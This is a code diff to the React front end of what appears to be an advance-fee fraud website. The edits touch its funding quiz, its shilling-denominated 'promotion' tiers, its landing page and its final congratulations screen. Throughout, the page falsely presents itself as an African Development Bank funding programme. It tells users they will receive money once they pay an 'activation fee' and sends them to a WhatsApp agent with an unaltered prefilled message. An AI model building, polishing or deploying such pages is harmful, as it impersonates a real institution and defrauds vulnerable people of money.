@@ -9,7 +9,7 @@ const questions = [
   },
 
   {
-    quiz: "ACCORDING TO OUR ORGANIZATION OFFER WHAT WILL PLAN WITH OUR FUNDS🇺🇸",
+    quiz: "ACCORDING TO OUR ORGANIZATION OFFER, WE NEED TO KNOW YOUR PLANS WITH THIS FUNDS",
     option: [
       "1.Emergencies",
       "2.Start a business",
@@ -23,7 +23,7 @@ const questions = [
 
 const ugandaOption = [
   {
-    quiz: "Congratulations you Qualify for the following limit/Offers. 💥☑Which promotion are you capable of paying it's activation fee?",
+    quiz: "Congratulations you Qualify for the following limit/Offers. 💥☑Which promotion are you capable To pay for it's activation fee?",
     option: [
       {
         type: "1:_UGX 25,000..........._UGX900,000",
@@ -739,18 +739,20 @@ function LandingPage({
           {landd ? (
             <>
               {" "}
-              <h6>
+              <h6 style={{ fontSize: "2.4rem" }}>
                 Congratulations for Creating Account Succefully you are Ready to
                 start application{" "}
               </h6>
               {/* <h4> Welcome {name} you are Ready to start applicatio </h4> */}
-              <p>
+              <p style={{ fontSize: "2.2rem" }}>
                 Your have been reqistered <strong>successfully</strong> in our
                 funding Programme. Now you are required to answer few
                 questions,and at the end you are also required to choose the
                 amount of Funds that you need, Thank You.
               </p>
-              <button onClick={onlandd}> CONTINUE</button>
+              <button onClick={onlandd} style={{ borderRadius: "8px" }}>
+                <strong>CONTINUE</strong>
+              </button>
             </>
           ) : (
             <>
@@ -818,7 +820,7 @@ function CongratsMessage({ balance, currency, custoName, activate }) {
   const whatAppURL = `https://wa.me/+254736227246?text=${encodedmessge}`;
   return (
     <div className="congra_message">
-      <h2> Congratulations For Reaching the last Step</h2>
+      <h2> CONGRATULATIONS FOR COMPLETING THE PROCESS</h2>
       <div>
         <div className="userdetails">
           <p>
@@ -845,9 +847,9 @@ function CongratsMessage({ balance, currency, custoName, activate }) {
         <p>
           You are now registered as a permanent beneficiary of AFRICAN
           DEVELOPMENT BANK. ✅ You are about to receive {currency} {balance}{" "}
-          𝒇𝒓𝒐𝒎 <i>FUNDING PROGRAMME</i>. We thereby want congratulate you for
+          𝒇𝒓𝒐𝒎 OUR <i>FUNDING PROGRAMME</i>. We thereby congratulate you for
           contacting and making your application🎉. Ensure to use these money in
-          an helpfull/development Way.{" "}
+          an Growthfull/development Way.{" "}
         </p>
         <p className="askmoney_p">
           {" "}
@@ -859,16 +861,18 @@ function CongratsMessage({ balance, currency, custoName, activate }) {
             for activation fee and immediately receive Activation code to unlock
             your promotion Awards Funds
           </strong>
-        </p>{" "}
-        𝕔𝕠𝕟𝕘𝕣𝕒𝕥𝕦𝕝𝕒𝕥𝕚𝕠𝕟 🎁To continue click the whatsapp link below to reach to
-        agent on whatApp who will guide on how to activate your Awards within 10
-        MINUTES. Your promotion is to be dispersed to your line within 10
-        minutes after Activation.
+        </p>
+        <p>
+          𝕔𝕠𝕟𝕘𝕣𝕒𝕥𝕦𝕝𝕒𝕥𝕚𝕠𝕟 🎁To continue click the whatsapp link below to reach to
+          agent on whatApp who will guide you on how to activate your Awards
+          within 10 MINUTES. Your promotion is to be dispersed to your line
+          within 10 minutes after Activation.
+        </p>
       </div>
       <p>
         <strong>
-          NOW click the whatApp below to be guided and receive funds within 5
-          minutes. NOTE: Don't change the message on whatApp. Thank You🙏.
+          NOW click the whatApp below to be guided and receive funds in 10
+          minutes time. NOTE: Don't change the message on whatApp. Thank You🙏.
         </strong>
       </p>
 
